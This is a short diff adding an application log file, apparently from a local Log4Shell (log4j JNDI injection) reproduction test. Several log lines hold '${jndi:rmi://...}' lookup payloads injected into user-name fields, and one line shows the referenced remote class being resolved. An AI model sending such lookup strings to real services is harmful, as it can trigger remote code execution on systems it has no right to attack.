@@ -1,0 +1,5 @@
+2021-12-14 at 13:53:13 CST INFO  ?   - 小六六的名字 ${jndi:rmi://127.0.0.1:1099/aaa}
+2021-12-14 at 14:36:13 CST INFO  ?   - 小六六的名字 ${jndi:rmi://127.0.0.1:1099/test}
+2021-12-14 at 14:37:12 CST INFO  ?   - 小六六的名字 Reference Class Name: com.lahmxu.OBJ
+
+2021-12-14 at 14:42:14 CST INFO  ?   - userName: ${jndi:rmi://127.0.0.1:1099/test}
